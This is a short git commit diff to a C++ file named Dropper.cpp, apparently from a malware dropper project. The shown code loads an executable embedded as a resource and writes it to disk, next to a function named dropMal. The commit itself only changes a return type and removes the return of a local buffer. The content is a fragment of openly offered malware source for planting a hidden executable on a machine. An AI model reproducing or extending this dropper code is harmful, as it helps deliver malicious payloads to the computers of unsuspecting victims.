72792e421688bc2d8727c5b173c5104d480b565a
CourtneyJane2904 <34748111+CourtneyJane2904@users.noreply.github.com>
2022-03-25 09:33:07 +0000

    Update Dropper.cpp

--- Dropper/Dropper.cpp
+++ Dropper/Dropper.cpp
@@ -9,7 +9,7 @@ void Dropper::extractExe()
 	exeBinLen = SizeofResource(NULL, resrc);
 } 
 
-wchar_t* Dropper::saveExeToDisk() 
+void Dropper::saveExeToDisk() 
 {
 	char destPath[500];
 	wchar_t winDestPath[500];
@@ -19,8 +19,6 @@ wchar_t* Dropper::saveExeToDisk()
 	std::mbstowcs(winDestPath, destPath, strlen(destPath)+1);
 	HANDLE newFile = CreateFile(winDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WriteFile(newFile, exeBin, exeBinLen, NULL, NULL);
-
-	return winDestPath;
 }
 
 void Dropper::dropMal() 
